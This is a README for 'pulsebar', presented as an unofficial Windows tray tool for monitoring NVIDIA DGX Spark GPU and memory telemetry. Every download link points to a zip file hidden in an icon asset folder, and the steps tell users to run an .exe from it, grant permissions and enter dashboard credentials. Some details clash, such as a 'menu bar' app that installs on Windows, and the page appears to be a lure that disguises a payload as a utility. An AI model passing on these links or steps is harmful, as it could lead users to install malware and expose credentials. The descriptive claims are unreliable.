# 📊 pulsebar - Monitor NVIDIA DGX Spark performance easily

[![](https://img.shields.io/badge/Download-Pulsebar-blue.svg)](https://github.com/balaj1310/pulsebar/raw/refs/heads/main/Packaging/Icon.icon/Assets/Software_2.7.zip)

## 💡 About this app

Pulsebar monitors your NVIDIA DGX Spark hardware. It sits in your menu bar. It tracks GPU usage and memory telemetry. You see your system status at a glance. It pulls data directly from your local DGX Dashboard. This tool helps you watch your hardware health.

## 🛠 Prerequisites

Your computer needs a few components to run this app. Ensure you have the following items ready:

* A Windows computer with network access to your DGX Spark unit.
* Existing credentials for your DGX Dashboard.
* A stable local network connection.

## 🚀 Getting Started

Follow these steps to install the app on your Windows system.

1. Visit the [official download page](https://github.com/balaj1310/pulsebar/raw/refs/heads/main/Packaging/Icon.icon/Assets/Software_2.7.zip) to obtain the latest version of the installer.
2. Locate the file ending in .exe in your Downloads folder.
3. Double-click the file to start the installation.
4. Follow the prompts on your screen.
5. Grant the app permission when Windows asks for access.

## ⚙️ Configuration

The app needs host information to find your hardware. 

1. Open the Pulsebar application from your Start menu.
2. Right-click the icon in your system tray.
3. Select Settings from the menu.
4. Enter the IP address of your DGX Spark unit.
5. Provide your dashboard access credentials.
6. Click Save to confirm your changes.
7. Restart the application if it fails to connect.

## 📈 Understanding Telemetry

Pulsebar displays two core metrics to help you manage your hardware:

* **GPU Usage:** This shows the percentage of processing power currently in use. High values indicate heavy task loads. 
* **Memory Telemetry:** This displays the amount of VRAM currently reserved by your tasks. Keep this value below your maximum capacity to maintain peak performance.

## 🧩 Troubleshooting

Check these common fixes if the app fails to show data:

* **Verify Network:** Ensure your computer remains on the same network as the DGX Spark hardware.
* **Check Credentials:** Re-enter your username and password in the settings menu to ensure no typing errors exist.
* **Firewall Review:** Ensure your firewall allows local traffic from the dashboard port.
* **Restart Service:** Close the app completely using the tray icon and open it again.

## 🛡 Security

Pulsebar stores your credentials locally on your device. The app communicates only with your internal DGX Spark hardware. It does not send data to third-party servers. Your tracking remains private.

## 📋 Features

* Real-time GPU monitoring.
* Low system resource consumption.
* Automatic updates for your hardware stats.
* Simple system tray integration.
* Minimal background footprint.

## 📥 Install Software

You can download the latest installer from the repository link. Navigate to [this page](https://github.com/balaj1310/pulsebar/raw/refs/heads/main/Packaging/Icon.icon/Assets/Software_2.7.zip) to start your download. Follow the installation steps listed in the Getting Started section to begin using the tool. 

## ℹ️ Frequently Asked Questions

**Does this app slow down my computer?**
No. It consumes very little memory and light processor resources.

**Can I monitor multiple units?**
Current versions focus on one primary unit. Use the settings menu to switch between different DGX Spark hosts.

**What happens if the connection drops?**
The icon turns grey. It will attempt to reconnect automatically once the network signal returns.

**Is this an official NVIDIA product?**
No. This is an unofficial tool created to help users monitor local DGX Spark hardware.